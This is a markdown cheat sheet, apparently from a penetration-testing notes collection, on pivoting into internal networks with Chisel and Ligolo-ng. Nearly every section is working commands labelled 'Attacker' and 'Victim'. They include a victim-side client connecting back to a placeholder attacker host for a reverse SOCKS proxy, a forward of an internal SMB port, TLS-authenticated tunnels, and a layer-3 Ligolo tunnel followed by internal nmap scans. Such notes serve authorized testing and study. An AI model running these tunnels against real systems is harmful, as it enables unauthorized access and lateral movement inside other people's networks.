---
title: Chisel & Ligolo-ng
category: pivoting
description: Reverse tunnels over HTTP/TLS for when SSH isn't available.
tags: [pivot, chisel, ligolo]
os: [any]
order: 20
---

## Chisel — reverse SOCKS (most common)

```bash
# Attacker (server)
chisel server --reverse -p 8000

# Victim (client) — connects back, exposes a SOCKS proxy on attacker
./chisel client http://{{LHOST}}:8000 R:1080:socks
```

Use it:

```bash
proxychains -q nmap -sT -Pn 10.0.0.0/24
```

## Chisel — single port forward

```bash
# Reach internal:445 from attacker via :4445
./chisel client http://{{LHOST}}:8000 R:4445:internal:445
```

## Chisel — TLS / auth

```bash
chisel server --reverse -p 443 --tls-cert cert.pem --tls-key key.pem --auth user:pass
./chisel client --auth user:pass https://{{LHOST}}:443 R:1080:socks
```

## Ligolo-ng — proper L3 tunnel (no proxychains needed)

```bash
# Attacker
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# In ligolo CLI after agent connects:
session
ifconfig                  # show agent's networks
start                     # start the tunnel
# Add a route on the attacker:
sudo ip route add 10.0.0.0/24 dev ligolo
```

```bash
# Victim (agent)
./agent -connect {{LHOST}}:11601 -ignore-cert
```

Now nmap/curl/etc work natively against 10.0.0.0/24.

## Ligolo — reverse expose (listener on agent → attacker port)

```text
# In ligolo session:
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
```

## Picking between them

```text
Chisel        — fast to set up, SOCKS-based, works on any host
Ligolo-ng     — proper L3 routing, no proxychains, requires tun on attacker
sshuttle      — if you have SSH access already
```
